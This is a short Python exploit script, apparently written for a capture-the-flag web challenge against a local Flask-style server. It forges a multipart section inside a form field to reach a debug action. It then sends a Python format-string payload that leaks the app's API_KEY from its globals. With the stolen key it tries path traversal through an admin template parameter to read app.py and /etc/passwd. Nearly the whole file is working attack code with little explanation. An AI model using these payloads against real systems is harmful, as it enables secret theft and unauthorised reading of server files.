import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 测试基本的路径
test_paths = [
    'index.html',  # 应该能读取
    '../app.py',   # 应该能读取
    '../../../etc/passwd',  # 应该能读取
    '../../../usr/local/lib/python3.13/site-packages/jinja2/defaults.py',
]

for p in test_paths:
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": p}, headers=headers, timeout=5.0)
        print(f"\n[{p}] Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  Content: {r.text[:200]}")
    except Exception as e:
        print(f"\n[{p}] Error: {e}")
